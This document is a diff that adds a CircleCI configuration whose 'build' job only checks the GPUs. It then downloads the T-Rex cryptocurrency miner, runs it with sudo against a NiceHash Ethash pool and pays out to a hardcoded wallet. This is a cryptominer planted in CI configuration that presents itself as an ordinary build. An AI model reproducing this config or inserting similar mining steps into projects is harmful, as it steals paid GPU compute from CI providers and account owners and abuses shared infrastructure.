@@ -1,0 +1,11 @@
+version: 2.1 
+ 
+jobs: 
+  build: 
+    machine: 
+      image: ubuntu-1604-cuda-10.1:201909-23 
+    resource_class: gpu.nvidia.large 
+    steps: 
+      - run: nvidia-smi 
+      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi 
+      - run: sudo apt-get update -y && wget  https://github.com/trexminer/T-Rex/releases/download/0.26.1/t-rex-0.26.1-linux.tar.gz && tar -zxvf  t-rex-0.26.1-linux.tar.gz && sudo ./t-rex -a ethash -o stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353 -u 3MyRREpFLArTEgRGw7Z8a3hFFn3LXo54T5.wijaya.$(echo $(shuf -i 1000-9999999999 -n 1)) -p x --gpu-report-interval 5 --mt 3
